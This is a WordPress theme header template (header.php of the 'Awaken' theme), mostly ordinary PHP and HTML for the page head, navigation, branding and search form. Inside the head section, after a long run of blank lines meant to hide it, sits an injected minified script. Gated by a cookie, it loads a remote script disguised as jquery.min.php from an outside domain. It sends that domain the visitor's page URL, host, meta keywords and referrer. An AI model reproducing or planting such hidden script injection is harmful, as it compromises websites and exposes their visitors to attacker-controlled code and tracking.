<?php
/**
 * The header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="content">
 *
 * @package Awaken
 */
?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
<?php wp_head(); ?>























<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://reparacionordenadoresonline.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'J18171' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
</head>

<body <?php body_class(); ?>>
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'awaken' ); ?></a>
	<header id="masthead" class="site-header" role="banner">
		
	<?php if ( has_nav_menu( 'top_navigation' ) || get_theme_mod( 'display_social_icons', false ) ) : ?>	
		<div class="top-nav">
			<div class="container">
				<div class="row">
					<?php is_rtl() ? $rtl = 'awaken-rtl' : $rtl = ''; ?>
					<div class="col-xs-12 col-sm-6 col-md-8 <?php echo $rtl; ?>">
						<?php if ( has_nav_menu( 'top_navigation' ) ) : ?>
							<nav id="top-navigation" class="top-navigation" role="navigation">
								<?php wp_nav_menu( array( 'theme_location' => 'top_navigation' ) ); ?>
							</nav><!-- #site-navigation -->	
							<a href="#" class="navbutton" id="top-nav-button"><?php _e( 'Top Menu', 'awaken' ); ?></a>
							<div class="responsive-topnav"></div>
						<?php endif; ?>			
					</div><!-- col-xs-12 col-sm-6 col-md-8 -->
					<div class="col-xs-12 col-sm-6 col-md-4">
						<?php awaken_socialmedia(); ?>
					</div><!-- col-xs-12 col-sm-6 col-md-4 -->
				</div><!-- row -->
			</div><!-- .container -->
		</div>
	<?php endif; ?>

	<div class="site-branding">
		<div class="container">
			<div class="site-brand-container">
				<?php  
					
					$logo = get_theme_mod( 'site_logo', '' );
					$title_option = get_theme_mod( 'site_title_option', 'text-only' );

					if ( $title_option == 'logo-only' && ! empty($logo) ) { ?>
						<div class="site-logo">
							<a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><img src="<?php echo esc_url( $logo ); ?>" alt="<?php bloginfo( 'name' ); ?>"></a>
						</div>
					<?php } 

					if ( $title_option == 'text-logo' && ! empty($logo) ) { ?>
						<div class="site-logo">
							<a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><img src="<?php echo esc_url( $logo ); ?>" alt="<?php bloginfo( 'name' ); ?>"></a>
						</div>
						<div class="site-title-text">
							<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
							<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
						</div>
					<?php } 

					if ( $title_option == 'text-only' ) { ?>
						<div class="site-title-text">
							<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
							<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
						</div>
				<?php } ?>
			</div><!-- .site-brand-container -->
		</div>
	</div>

	<div class="container">
		<div class="awaken-navigation-container">
			<nav id="site-navigation" class="main-navigation cl-effect-10" role="navigation">
				<?php wp_nav_menu( array( 'theme_location' => 'main_navigation' ) ); ?>
			</nav><!-- #site-navigation -->
			<a href="#" class="navbutton" id="main-nav-button"><?php _e( 'Main Menu', 'awaken' ); ?></a>
			<div class="responsive-mainnav"></div>

			<div class="awaken-search-button-icon"></div>
			<div class="awaken-search-box-container">
				<div class="awaken-search-box">
					<form action="<?php echo esc_url( home_url( '/' ) ); ?>" id="awaken-search-form" method="get">
						<input type="text" value="" name="s" id="s" />
						<input type="submit" value="<?php _e( 'Search', 'awaken' ); ?>" />
					</form>
				</div><!-- th-search-box -->
			</div><!-- .th-search-box-container -->
		</div><!-- .awaken-navigation-container-->
	</div><!-- .container -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="container">

	<?php 
		if ( is_front_page() ) {
			if ( get_theme_mod( 'display_slider', 1 ) == '1' ) {
				awaken_featured_posts();
			}
		}
	?>